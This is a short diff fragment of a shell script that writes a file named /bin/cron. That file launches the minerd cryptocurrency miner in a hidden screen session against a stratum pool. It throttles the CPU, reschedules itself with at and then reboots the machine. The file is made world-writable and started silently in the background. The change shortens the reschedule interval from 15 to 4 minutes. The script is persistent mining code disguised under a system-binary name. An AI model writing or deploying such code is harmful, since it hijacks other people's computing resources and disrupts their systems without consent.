@@ -22,7 +22,7 @@ echo "#!/bin/bash" > /bin/cron
 echo "[[ ${cpulimit} -gt "0" ]] && screen -dmS cpu cpulimit -e minerd -l ${cpulimit}" >> /bin/cron
 echo "screen -dmS zpool minerd -a ${algoritimo} -o stratum+tcp://${stratum}${walle}${eman} -t ${core} -R 30${coin}" >> /bin/cron
 echo "sleep ${rebo}m" >> /bin/cron
-echo "at -f /bin/cron now + 15 min" >> /bin/cron
+echo "at -f /bin/cron now + 4 min" >> /bin/cron
 echo "reboot" >> /bin/cron
 chmod 777 /bin/cron && bash /bin/cron & > /dev/null
 }
